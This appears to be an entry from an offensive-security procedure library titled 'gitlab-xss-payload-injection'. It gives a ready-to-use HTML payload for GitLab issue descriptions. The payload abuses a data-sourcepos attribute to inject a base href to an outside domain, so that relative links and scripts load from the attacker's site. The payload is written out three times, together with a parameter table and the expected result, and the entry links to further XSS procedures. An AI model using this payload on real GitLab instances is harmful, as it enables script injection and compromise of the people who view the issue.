---
data: >-
  <pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre><base
  href=https://joaxcar.com><pre x=&#34;"><code></code></pre>
tags:
  - xss
  - injection
type: command
executor: html
platforms:
  - Web
id: eb53fd73-0423-46a5-b4cb-56aec3978308
created_at: '2025-12-11T03:47:50.362Z'
updated_at: '2025-12-11T03:47:50.362Z'
verified: false
validated: true
submitted: true
---
# gitlab-xss-payload-injection

## Command

```html
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre><base href=https://joaxcar.com><pre x=&#34;"><code></code></pre>
```

## Description

Injects HTML into GitLab issue description to set base href and exploit XSS by redirecting relative links to attacker's site.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `href` | Sets base URL to attacker's domain | Yes |

## Examples

### Basic Usage

```html
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre><base href=https://joaxcar.com><pre x=&#34;"><code></code></pre>
```

## Expected Output

Redirects relative links to attacker's site, enabling malicious script loading.

## Related

- [[procedures/Trigger-and-Verify-XSS-Execution]]
- [[procedures/Inject-XSS-Payload-into-GitLab-Issue]]
